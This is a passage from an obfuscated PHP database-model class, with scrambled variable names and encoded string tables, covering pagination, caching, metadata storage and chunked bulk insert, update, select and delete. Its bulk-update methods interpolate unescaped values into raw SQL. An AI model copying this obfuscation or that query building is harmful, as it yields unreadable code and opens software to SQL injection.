{ return $´‹í«ã; } $²¶­›È„ = json_encode($´‹í«ã); $²¶­›È„ = preg_replace_callback($_SERVER[Î‹ÃÂŞ„][404], function ($êçê¶…•) { return addslashes($êçê¶…•[0]); }, $²¶­›È„); return json_decode($²¶­›È„); } public static function textDecode($‘ˆÍş¿ë) { $ªÃ°¿ƒÖ =& $_SERVER[Î‹ÃÂŞ„]; $Ğü›ª„ç = json_encode($‘ˆÍş¿ë); $Ğü›ª„ç = preg_replace_callback($ªÃ°¿ƒÖ[405], function ($ğäº›Û) { return $_SERVER[Î‹ÃÂŞ„][99]; }, $Ğü›ª„ç); return json_decode($Ğü›ª„ç); } public function setAutoIncrement($ƒÊšß˜›) { $±ê‹ª‡ñ = array($this->getPk() => $ƒÊšß˜›); $Êº»ÛñÓ = $this->data($±ê‹ª‡ñ)->add(); if ($Êº»ÛñÓ) { $this->delete($Êº»ÛñÓ); } } public function getAutoIncrement() { $Ã¤ÓÁüí = $this->getTableName(); $ÍËÛ£®“ = $this->max($this->getPk()); $÷Ÿ‰äÀ = $this->query("\x73\x68\x6f\167\40\x74\141\x62\154\145\x20\163\164\x61\x74\165\x73\x20\167\150\145\x72\x65\x20\116\141\x6d\x65\x3d\47{$Ã¤ÓÁüí}\47"); $ú¾êØ¤ = $÷Ÿ‰äÀ[0][$_SERVER[Î‹ÃÂŞ„][406]]; $ø‹É¿û = max($ÍËÛ£®“, $ú¾êØ¤); return $ø‹É¿û; } protected function _callBefore($‰åü°æ, $¢¥óÙ) { return $this->cacheCallCheck($‰åü°æ, $¢¥óÙ, !1); } protected function _callAfter($‹Šù…õÀ, $ÊÒÆÈ—ı) { return $this->cacheCallCheck($‹Šù…õÀ, $ÊÒÆÈ—ı, !0); } protected function cacheFunctionAlias($ªª—ø¶) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ƒ´Ú³¤ƒ, $ºˆ‘», $â¹×¦º£ = false) { $±ùå”êœ = $this->cacheFunctionAlias($ºˆ‘»); if (!$±ùå”êœ) { return; } foreach ($±ùå”êœ as $ÓÍæÔôÏ => $ì² ŞÔ) { $­®Å÷ãé = $ì² ŞÔ[0]; $š»Ãü°¢ = explode($_SERVER[Î‹ÃÂŞ„][50], $ì² ŞÔ[1]); if ($ƒ´Ú³¤ƒ == $ÓÍæÔôÏ) { return $this->cacheFunctionGet($ÓÍæÔôÏ, $­®Å÷ãé); } if ($â¹×¦º£ && in_array($ƒ´Ú³¤ƒ, $š»Ãü°¢)) { $this->cacheFunctionClear($ÓÍæÔôÏ, $­®Å÷ãé); } } } public function cacheFunctionGet($‹¬éòÂÈ, $ ‰ÚÁÙ) { $îâÅñûÅ = $this->cacheKeyMake($‹¬éòÂÈ, $ ‰ÚÁÙ); $’’¨Ëªˆ = Cache::get($îâÅñûÅ); if (!is_array($’’¨Ëªˆ)) { $’’¨Ëªˆ = call_user_func_array(array($this, $‹¬éòÂÈ), array($ ‰ÚÁÙ, !0)); Cache::set($îâÅñûÅ, $’’¨Ëªˆ); } return $’’¨Ëªˆ; } public function cacheFunctionClear($å³»úÌ‰, $î·Øâãº) { $ú¬äÜ‡ = $î·Øâãº; if (!is_array($î·Øâãº)) { $ú¬äÜ‡ = array($î·Øâãº); } foreach ($ú¬äÜ‡ as $åÆ¿Ö•) { $´éŒÌ¨ƒ = $this->cacheKeyMake($å³»úÌ‰, $åÆ¿Ö•); Cache::remove($´éŒÌ¨ƒ); } } private function cacheKeyMake($Š†¬ÇÛÀ, $ÉÊØ’‚) { $ÚÆ²˜¸ =& $_SERVER[Î‹ÃÂŞ„]; return get_class($this) . $ÚÆ²˜¸[11] . $Š†¬ÇÛÀ . $ÚÆ²˜¸[407] . $ÉÊØ’‚; } protected function selectPageReset() { $Õ§Â·å =& $_SERVER[Î‹ÃÂŞ„]; if (isset($GLOBALS[$Õ§Â·å[408]])) { return; } $GLOBALS[$Õ§Â·å[408]] = isset($GLOBALS[$Õ§Â·å[7]][$Õ§Â·å[409]]) ? $GLOBALS[$Õ§Â·å[7]][$Õ§Â·å[409]] : !1; $GLOBALS[$Õ§Â·å[410]] = isset($GLOBALS[$Õ§Â·å[7]][$Õ§Â·å[399]]) ? $GLOBALS[$Õ§Â·å[7]][$Õ§Â·å[399]] : !1; $GLOBALS[$Õ§Â·å[7]][$Õ§Â·å[409]] = !1; $GLOBALS[$Õ§Â·å[7]][$Õ§Â·å[399]] = !1; } protected function selectPageRestore() { $Ö„ä‹½½ =& $_SERVER[Î‹ÃÂŞ„]; if (!isset($GLOBALS[$Ö„ä‹½½[408]])) { return; } $GLOBALS[$Ö„ä‹½½[7]][$Ö„ä‹½½[409]] = $GLOBALS[$Ö„ä‹½½[408]]; $GLOBALS[$Ö„ä‹½½[7]][$Ö„ä‹½½[399]] = $GLOBALS[$Ö„ä‹½½[410]]; if ($GLOBALS[$Ö„ä‹½½[7]][$Ö„ä‹½½[409]] === !1) { unset($GLOBALS[$Ö„ä‹½½[7]][$Ö„ä‹½½[409]]); } if ($GLOBALS[$Ö„ä‹½½[7]][$Ö„ä‹½½[399]] === !1) { unset($GLOBALS[$Ö„ä‹½½[7]][$Ö„ä‹½½[399]]); } unset($GLOBALS[$Ö„ä‹½½[408]]); unset($GLOBALS[$Ö„ä‹½½[410]]); } protected function selectPage($„ıÖ½À = 200, $‘×¦¼³É = 1) { $ˆ©˜°Òı =& $_SERVER[Î‹ÃÂŞ„]; global $in; $¢‹‘èÖÉ = $this->optionsValue(); $ñ«¼èëî = 50000; $„ıÖ½À = isset($in[$ˆ©˜°Òı[409]]) && $in[$ˆ©˜°Òı[409]] ? $in[$ˆ©˜°Òı[409]] : $„ıÖ½À; if ($„ıÖ½À === -1) { $in[$ˆ©˜°Òı[409]] = !1; $ñ«¼èëî = 100000000; $„ıÖ½À = $ñ«¼èëî; } $‘€„êç« = $¢‹‘èÖÉ; $‘€„êç«[$ˆ©˜°Òı[411]] = array(); $„ıÖ½À = intval($„ıÖ½À); $„ıÖ½À = $„ıÖ½À <= 5 ? 5 : ($„ıÖ½À >= $ñ«¼èëî ? $ñ«¼èëî : $„ıÖ½À); $‘×¦¼³É = intval(isset($in[$ˆ©˜°Òı[399]]) && $in[$ˆ©˜°Òı[399]] ? $in[$ˆ©˜°Òı[399]] : $‘×¦¼³É); $‘×¦¼³É = $‘×¦¼³É <= 1 ? 1 : $‘×¦¼³É; $Ÿèáû = array(); $Ì§·«˜ = 1; if ($‘×¦¼³É == 1 && $Ì§·«˜) { $this->optionsValue($¢‹‘èÖÉ); $Ÿèáû = $this->page($‘×¦¼³É, $„ıÖ½À)->select(); $‚²Çèñ = is_array($Ÿèáû) ? count($Ÿèáû) : 0; if ($‚²Çèñ < $„ıÖ½À) { $œ’ÂÊ¦ = 1; } else { $this->optionsValue($‘€„êç«); $‚²Çèñ = intval($this->count()); $œ’ÂÊ¦ = ceil($‚²Çèñ / $„ıÖ½À); } } else { $this->optionsValue($‘€„êç«); $‚²Çèñ = intval($this->count()); $œ’ÂÊ¦ = ceil($‚²Çèñ / $„ıÖ½À); $‘×¦¼³É = $‘×¦¼³É >= $œ’ÂÊ¦ ? $œ’ÂÊ¦ : $‘×¦¼³É; $this->optionsValue($¢‹‘èÖÉ); $Ÿèáû = $this->page($‘×¦¼³É, $„ıÖ½À)->select(); } if (!is_array($Ÿèáû)) { $Ÿèáû = array(); } if ($œ’ÂÊ¦ == 1) { $‚²Çèñ = count($Ÿèáû); } $½Ç¬ñ„– = array($ˆ©˜°Òı[412] => array($ˆ©˜°Òı[413] => $‚²Çèñ, $ˆ©˜°Òı[409] => $„ıÖ½À, $ˆ©˜°Òı[399] => $‘×¦¼³É, $ˆ©˜°Òı[414] => $œ’ÂÊ¦), $ˆ©˜°Òı[415] => $Ÿèáû); return $½Ç¬ñ„–; } protected function checkLength($¶’ÏŸä¨, $Š­ÀşŞÕ = 0, $ûÚÈ­¥ó = '') { $¤–ö÷â÷ =& $_SERVER[Î‹ÃÂŞ„]; $Š­ÀşŞÕ = $Š­ÀşŞÕ ? $Š­ÀşŞÕ : 65536; if (!$¶’ÏŸä¨ || strlen($¶’ÏŸä¨) < $Š­ÀşŞÕ) { return; } $ûÚÈ­¥ó = $ûÚÈ­¥ó ? $ûÚÈ­¥ó . $¤–ö÷â÷[73] : $¤–ö÷â÷[12]; show_json($ûÚÈ­¥ó . LNG($¤–ö÷â÷[416]) . "\x28{$Š­ÀşŞÕ}\51", !1); } protected function metaSet($ò»ç¡ü, $—Å©é±¨ = null, $’¨Å´ß = null) { $å˜İ¶ÚŒ =& $_SERVER[Î‹ÃÂŞ„]; if (!$this->tableMeta || !$ò»ç¡ü) { return !1; } $„ÛêîÍ¡ = $this->tableMeta[$å˜İ¶ÚŒ[417]]; $¼ìô¤›« = $this->tableMeta[$å˜İ¶ÚŒ[418]]; $üéı¹¹× = Model($¼ìô¤›«); $Ñìš•ï = array($„ÛêîÍ¡ => $ò»ç¡ü, $å˜İ¶ÚŒ[419] => $—Å©é±¨); if (is_null($—Å©é±¨)) { return $üéı¹¹×->where(array($„ÛêîÍ¡ => $ò»ç¡ü))->delete(); } if (is_null($’¨Å´ß) && is_string($—Å©é±¨)) { return $üéı¹¹×->where($Ñìš•ï)->delete(); } $ÔşÏ‡ç = is_array($—Å©é±¨) ? $—Å©é±¨ : array(); if (is_string($—Å©é±¨)) { $ÔşÏ‡ç[$—Å©é±¨] = $’¨Å´ß; } $™ûŒøÚ = array(); foreach ($ÔşÏ‡ç as $¨ÙÜßØ => $àÀ˜œ†) { if (is_null($àÀ˜œ†) && is_string($¨ÙÜßØ)) { $üéı¹¹×->where(array($„ÛêîÍ¡ => $ò»ç¡ü, $å˜İ¶ÚŒ[419] => $¨ÙÜßØ))->delete(); continue; } $this->checkLength($àÀ˜œ†, !1, $¼ìô¤›« . $å˜İ¶ÚŒ[4] . $¨ÙÜßØ); $™ûŒøÚ[] = array($„ÛêîÍ¡ => $ò»ç¡ü, $å˜İ¶ÚŒ[96] => $¨ÙÜßØ, $å˜İ¶ÚŒ[420] => $àÀ˜œ†); } $…÷­èó = $å˜İ¶ÚŒ[421] . $¼ìô¤›«; CacheLock::lock($…÷­èó); $üéı¹¹×->where(array($„ÛêîÍ¡ => $ò»ç¡ü))->addAll($™ûŒøÚ, array(), !0); CacheLock::unlock($…÷­èó); return !0; } public function metaGet($Åµ¾ß“—, $ãÕşí• = false) { $ ú÷ÓœÜ =& $_SERVER[Î‹ÃÂŞ„]; if (!$this->tableMeta) { return array(); } $—ÜĞËÜÉ = $this->tableMeta[$ ú÷ÓœÜ[417]]; $íç¶íÉˆ = Model($this->tableMeta[$ ú÷ÓœÜ[418]]); if ($ãÕşí•) { $ìÆ‡ã· = array($—ÜĞËÜÉ => $Åµ¾ß“—, $ ú÷ÓœÜ[96] => $ãÕşí•); return $íç¶íÉˆ->where($ìÆ‡ã·)->getField($ ú÷ÓœÜ[420]); } $ìÆ‡ã· = array($—ÜĞËÜÉ => $Åµ¾ß“—); $šÌ¶ı´Ñ = $íç¶íÉˆ->field($ ú÷ÓœÜ[422])->where($ìÆ‡ã·)->select(); $šÌ¶ı´Ñ = array_to_keyvalue($šÌ¶ı´Ñ, $ ú÷ÓœÜ[96], $ ú÷ÓœÜ[420]); return $šÌ¶ı´Ñ; } private function checkDataAutoHas($ËĞ±Ê‹°) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $’™¯¤¨¢) { if (in_array($ËĞ±Ê‹°, explode($_SERVER[Î‹ÃÂŞ„][50], $’™¯¤¨¢[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$²¨ÑŞ«, $ë½¥õî®) { $ˆ‘‰ÇŞ‰ =& $_SERVER[Î‹ÃÂŞ„]; if (!is_array($²¨ÑŞ«)) { return; } foreach ($this->dataAuto as $®Ú¾¨›Â) { $£¹€ ò = $®Ú¾¨›Â[0]; if (!in_array($ë½¥õî®, explode($ˆ‘‰ÇŞ‰[50], $®Ú¾¨›Â[2]))) { continue; } switch (trim($®Ú¾¨›Â[3])) { case $ˆ‘‰ÇŞ‰[367]: case $ˆ‘‰ÇŞ‰[368]: $äÏı½‘ = $®Ú¾¨›Â[1]; $Ÿ‘Á‡¥ = isset($®Ú¾¨›Â[4]) ? (array) $®Ú¾¨›Â[4] : array(); if ($äÏı½‘ == $ˆ‘‰ÇŞ‰[196] && array_key_exists($£¹€ ò, $²¨ÑŞ«)) { if (!$²¨ÑŞ«[$£¹€ ò]) { unset($²¨ÑŞ«[$£¹€ ò]); } break; } if (isset($²¨ÑŞ«[$£¹€ ò])) { array_unshift($Ÿ‘Á‡¥, $²¨ÑŞ«[$£¹€ ò]); } if ($ˆ‘‰ÇŞ‰[367] == $®Ú¾¨›Â[3]) { $²¨ÑŞ«[$£¹€ ò] = call_user_func_array($äÏı½‘, $Ÿ‘Á‡¥); } else { $²¨ÑŞ«[$£¹€ ò] = call_user_func_array(array(&$this, $äÏı½‘), $Ÿ‘Á‡¥); } break; case $ˆ‘‰ÇŞ‰[316]: if (isset($²¨ÑŞ«[$£¹€ ò]) && $²¨ÑŞ«[$£¹€ ò]) { $²¨ÑŞ«[$£¹€ ò] = call_user_func_array(array(&$this, $®Ú¾¨›Â[1]), array($²¨ÑŞ«[$£¹€ ò])); } break; case $ˆ‘‰ÇŞ‰[319]: $²¨ÑŞ«[$£¹€ ò] = $²¨ÑŞ«[$®Ú¾¨›Â[1]]; break; case $ˆ‘‰ÇŞ‰[340]: if (isset($²¨ÑŞ«[$£¹€ ò]) && !is_string($²¨ÑŞ«[$£¹€ ò])) { $²¨ÑŞ«[$£¹€ ò] = json_encode_force($²¨ÑŞ«[$£¹€ ò]); } break; case $ˆ‘‰ÇŞ‰[369]: if ($²¨ÑŞ«[$£¹€ ò] === $ˆ‘‰ÇŞ‰[12]) { unset($²¨ÑŞ«[$£¹€ ò]); } break; case $ˆ‘‰ÇŞ‰[370]: $²¨ÑŞ«[$£¹€ ò] = $®Ú¾¨›Â[1]; default: break; } } if ($ë½¥õî® == $ˆ‘‰ÇŞ‰[401]) { $è€âà˜Ö = strtolower($this->db->getDbType()); if (strpos($è€âà˜Ö, $ˆ‘‰ÇŞ‰[13]) !== 0) { return; } $á¯ˆ• ¢ = $this->field(!0)->fields; $ã›ÓèúĞ = $á¯ˆ• ¢[$ˆ‘‰ÇŞ‰[298]]; if (isset($á¯ˆ• ¢[$ˆ‘‰ÇŞ‰[297]])) { unset($ã›ÓèúĞ[$á¯ˆ• ¢[$ˆ‘‰ÇŞ‰[297]]]); } foreach ($ã›ÓèúĞ as $§¢…²‹÷ => $ë½¥õî®) { if (!isset($²¨ÑŞ«[$§¢…²‹÷])) { $²¨ÑŞ«[$§¢…²‹÷] = $ˆ‘‰ÇŞ‰[12]; } } } } private function dataAfterFilter(&$¼ïñ†ª¢) { $Ÿ‘ù×Ê  =& $_SERVER[Î‹ÃÂŞ„]; foreach ($this->dataAuto as $­“°ÇÊ) { $–…™®”Š = $­“°ÇÊ[0]; if (!isset($¼ïñ†ª¢[$–…™®”Š])) { continue; } if (!in_array($Ÿ‘ù×Ê [403], explode($Ÿ‘ù×Ê [50], $­“°ÇÊ[2]))) { continue; } switch (trim($­“°ÇÊ[3])) { case $Ÿ‘ù×Ê [367]: case $Ÿ‘ù×Ê [368]: $û×š¶«Ñ = isset($­“°ÇÊ[4]) ? (array) $­“°ÇÊ[4] : array(); array_unshift($û×š¶«Ñ, $¼ïñ†ª¢[$–…™®”Š]); if (isset($­“°ÇÊ[4]) && $­“°ÇÊ[4] == $Ÿ‘ù×Ê [423]) { $û×š¶«Ñ = array($¼ïñ†ª¢[$–…™®”Š]); } if ($Ÿ‘ù×Ê [367] == $­“°ÇÊ[3]) { $¼ïñ†ª¢[$–…™®”Š] = call_user_func_array($­“°ÇÊ[1], $û×š¶«Ñ); } else { $¼ïñ†ª¢[$–…™®”Š] = call_user_func_array(array(&$this, $­“°ÇÊ[1]), $û×š¶«Ñ); } break; case $Ÿ‘ù×Ê [316]: if (isset($¼ïñ†ª¢[$–…™®”Š]) && $¼ïñ†ª¢[$–…™®”Š]) { $¼ïñ†ª¢[$–…™®”Š] = call_user_func_array(array(&$this, $­“°ÇÊ[1]), array($¼ïñ†ª¢[$–…™®”Š])); } break; case $Ÿ‘ù×Ê [319]: $¼ïñ†ª¢[$–…™®”Š] = $¼ïñ†ª¢[$­“°ÇÊ[1]]; break; case $Ÿ‘ù×Ê [340]: $İıº»Ù° = $¼ïñ†ª¢[$–…™®”Š]; $¼ïñ†ª¢[$–…™®”Š] = json_decode($İıº»Ù°, !0); if (is_null($¼ïñ†ª¢[$–…™®”Š])) { $¼ïñ†ª¢[$–…™®”Š] = $İıº»Ù°; } break; case $Ÿ‘ù×Ê [369]: if ($¼ïñ†ª¢[$–…™®”Š] === $Ÿ‘ù×Ê [12]) { unset($¼ïñ†ª¢[$–…™®”Š]); } break; case $Ÿ‘ù×Ê [370]: $¼ïñ†ª¢[$–…™®”Š] = $­“°ÇÊ[1]; break; default: break; } } } public function saveAll($ÕÅÃ) { $Ô¹Ú³Ğ¹ =& $_SERVER[Î‹ÃÂŞ„]; $—øÁ¸ı˜ = $this->tablePrefix . $this->tableName; $¤ÈƒÒÍ³ = self::SQL_WHERE_IN_CHUNK; $ÕÅÃ = is_array($ÕÅÃ) ? $ÕÅÃ : array(); $’úûÑğ¶ = $Ô¹Ú³Ğ¹[424]; $âí©ÌùŸ = 0; $ñ¼Î¤ = array(); $üñ•‰…É = count($ÕÅÃ); for ($‚ú·É„ = 0; $‚ú·É„ < $üñ•‰…É; $‚ú·É„++) { $ö‡ô‚´› = $ÕÅÃ[$‚ú·É„]; if (!is_array($ö‡ô‚´›) || count($ö‡ô‚´›) != 4) { continue; } $€óÙÇ“¥ = "\x55\x50\x44\101\124\x45\x20\x60{$—øÁ¸ı˜}\140\40\x53\x45\x54\x20{$ö‡ô‚´›[2]}\40\75\x20\x43\x41\123\x45\x20{$ö‡ô‚´›[0]}\x20\xa"; if ($âí©ÌùŸ == 0) { $’úûÑğ¶ = $€óÙÇ“¥; } $ñ¼Î¤[] = $Ô¹Ú³Ğ¹[120] . $ö‡ô‚´›[1] . $Ô¹Ú³Ğ¹[120]; $âí©ÌùŸ++; $’úûÑğ¶ .= "\x20\x57\110\x45\x4e\x20\x27{$ö‡ô‚´›[1]}\x27\40\x54\110\105\x4e\x20\47{$ö‡ô‚´›[3]}\x27\40\xa"; if ($âí©ÌùŸ == $¤ÈƒÒÍ³ || $‚ú·É„ == $üñ•‰…É - 1) { $Öâ—Ø¿ = implode($Ô¹Ú³Ğ¹[50], $ñ¼Î¤); $’úûÑğ¶ .= "\40\105\x4e\x44\x20\40\127\110\x45\x52\x45\40{$ö‡ô‚´›[0]}\40\111\116\40\50{$Öâ—Ø¿}\51\40"; $this->execute($’úûÑğ¶); $âí©ÌùŸ = 0; $’úûÑğ¶ = $€óÙÇ“¥; $this->chunkEventCheck(count($ñ¼Î¤)); $ñ¼Î¤ = array(); } } $this->chunkEventSet(); } public function saveAllEach($¹ÌÛòùë) { $›Ù–ûêº =& $_SERVER[Î‹ÃÂŞ„]; $‰ÕÁ‘ã„ = $this->tablePrefix . $this->tableName; foreach ($¹ÌÛòùë as $ó­Ñ€œŒ) { if (!is_array($ó­Ñ€œŒ) || count($ó­Ñ€œŒ) != 4) { continue; } $‹µ¶”“ = $ó­Ñ€œŒ[0] . $›Ù–ûêº[425] . $ó­Ñ€œŒ[1] . $›Ù–ûêº[120]; $…Ú¯·ø¤ = $ó­Ñ€œŒ[2] . $›Ù–ûêº[425] . $ó­Ñ€œŒ[3] . $›Ù–ûêº[120]; $áØù“ú = "\165\x70\x64\x61\x74\145\40{$‰ÕÁ‘ã„}\x20\163\145\164\40{$…Ú¯·ø¤}\40\x77\x68\145\x72\x65\40{$‹µ¶”“}\73"; $this->execute($áØù“ú); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Ğ¼ÎøÏ“ = false, $ïŞÆ­—Ï = false) { $this->_chunkEvent = $Ğ¼ÎøÏ“; $this->_chunkEventParam = $ïŞÆ­—Ï; } private function chunkEventCheck($°è˜¥Ò) { if (!$this->_chunkEvent) { return; } $¢€ß´®Ì = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $¢€ß´®Ì[$_SERVER[Î‹ÃÂŞ„][426]] = $°è˜¥Ò; Hook::trigger($this->_chunkEvent, $¢€ß´®Ì); } public function addAll($”º¾ó¢½, $ê”ê¿¨Ô = array(), $ÄÄ„Ùªæ = false) { $ É«‘Ø =& $_SERVER[Î‹ÃÂŞ„]; ignore_timeout(); $Ÿ‰€€¸¯ = self::SQL_WHERE_IN_CHUNK; if (empty($”º¾ó¢½)) { $this->error = think_lang($ É«‘Ø[317]); return !1; } $ê”ê¿¨Ô = $this->_parseOptions($ê”ê¿¨Ô); foreach ($”º¾ó¢½ as $å£İÜ—Ó => $‚ÄÁ™’Ñ) { $”º¾ó¢½[$å£İÜ—Ó] = $this->_facade($‚ÄÁ™’Ñ); $this->_beforeInsert($”º¾ó¢½[$å£İÜ—Ó], $ê”ê¿¨Ô); } if (method_exists($this->db, $ É«‘Ø[318])) { for ($·˜…¶¢» = 0; $·˜…¶¢» < count($”º¾ó¢½); $·˜…¶¢» += $Ÿ‰€€¸¯) { $¬¡ïÑÆ¿ = array_slice($”º¾ó¢½, $·˜…¶¢», $Ÿ‰€€¸¯); if (!is_array($¬¡ïÑÆ¿) || count($¬¡ïÑÆ¿) == 0) { break; } $Ùë†ñé— = $this->db->insertAll($¬¡ïÑÆ¿, $ê”ê¿¨Ô, $ÄÄ„Ùªæ); $this->chunkEventCheck(count($¬¡ïÑÆ¿)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($”º¾ó¢½ as $å£İÜ—Ó => $‚ÄÁ™’Ñ) { $Ùë†ñé— = $this->db->insert($‚ÄÁ™’Ñ, $ê”ê¿¨Ô, $ÄÄ„Ùªæ); } $this->commit(); } if (!1 !== $Ùë†ñé—) { $·İ€™ÂÕ = $this->getLastInsID(); if ($·İ€™ÂÕ) { return $·İ€™ÂÕ; } } return $Ùë†ñé—; } public function save($âòğÕòã = '', $ö¥ºÍƒ¾ = array()) { $öåşÌ€õ =& $_SERVER[Î‹ÃÂŞ„]; $ñÙşƒ  = self::SQL_WHERE_IN_CHUNK; $ê¾£¢¾ü = $this->optionsValue(); $÷Ã¿Ääü = $this->findWhereField($ê¾£¢¾ü); if (!$÷Ã¿Ääü) { return parent::save($âòğÕòã, $ö¥ºÍƒ¾); } $ÁÙ¾­Ûï = 0; $ı¥Ë·Ë = $ê¾£¢¾ü[$öåşÌ€õ[321]][$÷Ã¿Ääü][1]; $ı¥Ë·Ë = is_array($ı¥Ë·Ë) ? $ı¥Ë·Ë : array(); $ıÉ ÂË = count($ı¥Ë·Ë); for ($ŸÂ˜ÛÅ = 0; $ŸÂ˜ÛÅ < $ıÉ ÂË; $ŸÂ˜ÛÅ += $ñÙşƒ ) { $£¬šÔÍ­ = array_slice($ı¥Ë·Ë, $ŸÂ˜ÛÅ, $ñÙşƒ ); if (!is_array($£¬šÔÍ­) || count($£¬šÔÍ­) == 0) { break; } $ê¾£¢¾ü[$öåşÌ€õ[321]][$÷Ã¿Ääü][1] = $£¬šÔÍ­; $this->optionsValue($ê¾£¢¾ü); $ÁÙ¾­Ûï += parent::save($âòğÕòã, $ö¥ºÍƒ¾); $this->chunkEventCheck(count($£¬šÔÍ­)); } $this->chunkEventSet(); return $ÁÙ¾­Ûï; } public function add($Ù™æø½Ó = '', $“ßßöÁà = array(), $ğû¢ÉÉÔ = false) { if ($this->addTaskStatus && is_array($Ù™æø½Ó)) { $this->addTaskData[] = $Ù™æø½Ó; return; } return parent::add($Ù™æø½Ó, $“ßßöÁà, $ğû¢ÉÉÔ); } public function parseWhereLike($õ™³ÕŸ³, $ê‹Ñ§¿ç = '', $›Í³á¾ä = false, &$è¢Õ±˜ = false) { $ì×üœ‚® =& $_SERVER[Î‹ÃÂŞ„]; $ó–¹İ¶ç = $GLOBALS[$ì×üœ‚®[6]][$ì×üœ‚®[427]]; if (!$ó–¹İ¶ç[$ì×üœ‚®[428]]) { return $õ™³ÕŸ³; } if (!is_array($õ™³ÕŸ³)) { return $õ™³ÕŸ³; } $‚÷ş–§Ã = array(); $û¹ùºñÏ = 0; foreach ($õ™³ÕŸ³ as $èß¡£û¿ => $ğÀË·µ‚) { if (is_array($ğÀË·µ‚) && count($ğÀË·µ‚) == 2 && $ğÀË·µ‚[0] == $ì×üœ‚®[429] && is_string($ğÀË·µ‚[1]) && substr($ğÀË·µ‚[1], 0, 1) == $ì×üœ‚®[430] && substr($ğÀË·µ‚[1], strlen($ğÀË·µ‚[1]) - 1, 1) == $ì×üœ‚®[430]) { $è¢Õ±˜ = !0; $ÚŸÊÏÜ = is_string($èß¡£û¿) ? $èß¡£û¿ : $ê‹Ñ§¿ç; $ã›ªğó = substr($ğÀË·µ‚[1], 1, strlen($ğÀË·µ‚[1]) - 2); $ã›ªğó = $this->db->escapeString($ã›ªğó); if (!strpos($ÚŸÊÏÜ, $ì×üœ‚®[10])) { $ÚŸÊÏÜ = $ì×üœ‚®[431] . $ÚŸÊÏÜ . $ì×üœ‚®[431]; } $ô®øù¹õ = $ì×üœ‚®[205] . $ã›ªğó . $ì×üœ‚®[205]; $ã›ªğó = str_replace(array($ì×üœ‚®[10], $ì×üœ‚®[432], $ì×üœ‚®[11]), $ì×üœ‚®[433], $ã›ªğó); if ($ó–¹İ¶ç[$ì×üœ‚®[434]]) { $ô®øù¹õ = $ì×üœ‚®[435] . $ã›ªğó . $ì×üœ‚®[436]; if ($ó–¹İ¶ç[$ì×üœ‚®[437]]) { $ô®øù¹õ = $ì×üœ‚®[436] . $ã›ªğó . $ì×üœ‚®[435]; } } $‚÷ş–§Ã[$û¹ùºñÏ] = $ì×üœ‚®[438] . $ÚŸÊÏÜ . $ì×üœ‚®[439] . $ô®øù¹õ . $ì×üœ‚®[440]; $û¹ùºñÏ++; continue; } if (is_array($ğÀË·µ‚)) { $ê‹Ñ§¿ç = is_string($èß¡£û¿) ? $èß¡£û¿ : $ê‹Ñ§¿ç; $ğÀË·µ‚ = $this->parseWhereLike($ğÀË·µ‚, $ê‹Ñ§¿ç, !0, $è¢Õ±˜); } if (is_numeric($èß¡£û¿)) { $‚÷ş–§Ã[$û¹ùºñÏ] = $ğÀË·µ‚; $û¹ùºñÏ++; } else { $‚÷ş–§Ã[$èß¡£û¿] = $ğÀË·µ‚; } } if ($è¢Õ±˜ && !$›Í³á¾ä) { } return $‚÷ş–§Ã; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Üüì ‡¸ = array()) { $·¥“½®á =& $_SERVER[Î‹ÃÂŞ„]; $ş¸·ü›å = self::SQL_WHERE_IN_CHUNK; $éòÒ­­³ = $this->optionsValue(); $… º îµ = $this->findWhereField($éòÒ­­³); if (!$… º îµ || isset($éòÒ­­³[$·¥“½®á[338]]) || isset($éòÒ­­³[$·¥“½®á[399]])) { return parent::select($Üüì ‡¸); } $ÅĞ˜´‡ = $éòÒ­­³[$·¥“½®á[321]][$… º îµ][1]; $ÅĞ˜´‡ = is_array($ÅĞ˜´‡) ? $ÅĞ˜´‡ : array(); $îÓ›¹–å = null; for ($Ş ´³ï = 0; $Ş ´³ï < count($ÅĞ˜´‡); $Ş ´³ï += $ş¸·ü›å) { $òˆ·‰»Ø = array_slice($ÅĞ˜´‡, $Ş ´³ï, $ş¸·ü›å); if (!is_array($òˆ·‰»Ø) || count($òˆ·‰»Ø) == 0) { break; } $éòÒ­­³[$·¥“½®á[321]][$… º îµ][1] = $òˆ·‰»Ø; $this->optionsValue($éòÒ­­³); $æÆ©ç§ = parent::select($Üüì ‡¸); if (!$æÆ©ç§) { continue; } $îÓ›¹–å = is_array($îÓ›¹–å) ? $îÓ›¹–å : array(); $îÓ›¹–å = array_merge($îÓ›¹–å, $æÆ©ç§); } return $îÓ›¹–å; } public function delete($Ó®ø˜‚— = array()) { $à—¨ñ„ =& $_SERVER[Î‹ÃÂŞ„]; $€Œ÷™Êî = self::SQL_WHERE_IN_CHUNK; $œªİí™İ = $this->optionsValue(); $é›çêş§ = $this->findWhereField($œªİí™İ); if (!$é›çêş§) { return parent::delete($Ó®ø˜‚—); } $Çùµãá¤ = 0; $çïşÔÒİ = $œªİí™İ[$à—¨ñ„[321]][$é›çêş§][1]; $çïşÔÒİ = is_array($çïşÔÒİ) ? $çïşÔÒİ : array(); for ($ ó•¸™Ö = 0; $ ó•¸™Ö < count($çïşÔÒİ); $ ó•¸™Ö += $€Œ÷™Êî) { $ÁÓ‰ä§ = array_slice($çïşÔÒİ, $ ó•¸™Ö, $€Œ÷™Êî); if (!is_array($ÁÓ‰ä§) || count($ÁÓ‰ä§) == 0) { break; } $œªİí™İ[$à—¨ñ„[321]][$é›çêş§][1] = $ÁÓ‰ä§; $this->optionsValue($œªİí™İ); $Çùµãá¤ += parent::delete($Ó®ø˜‚—); } return $Çùµãá¤; } private function findWhereField($–ƒÅ¯²) { $¢² Ğ¨ñ =& $_SERVER[Î‹ÃÂŞ„]; $ğ°ĞïËµ = self::SQL_WHERE_IN_CHUNK; if (!is_array($–ƒÅ¯²) || !is_array($–ƒÅ¯²[$¢² Ğ¨ñ[321]])) { return !1; } foreach ($–ƒÅ¯²[$¢² Ğ¨ñ[321]] as $¶Î²¤ª² => 